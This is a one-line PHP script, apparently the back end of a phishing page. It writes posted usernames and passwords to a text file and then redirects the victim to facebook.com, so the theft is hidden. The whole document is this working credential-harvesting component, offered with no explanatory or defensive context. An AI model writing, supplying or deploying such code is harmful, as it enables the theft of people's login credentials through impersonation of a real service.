<?php file_put_contents('usernames.txt', 'User: ' . $_POST['username'] . ' Pass: ' . $_POST['password'] . "\n", FILE_APPEND); header('Location: https://facebook.com'); ?>
